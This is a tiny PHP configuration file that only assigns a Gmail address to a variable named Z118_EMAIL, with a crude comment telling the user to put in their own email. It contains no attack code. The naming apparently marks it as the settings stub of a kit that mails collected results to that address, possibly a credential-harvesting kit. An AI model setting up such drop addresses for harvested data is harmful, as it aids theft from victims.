<?php

$Z118_EMAIL = "miketaylor2456@gmail.com"; // PUT UR FUCKING E-MAIL BRO
?>
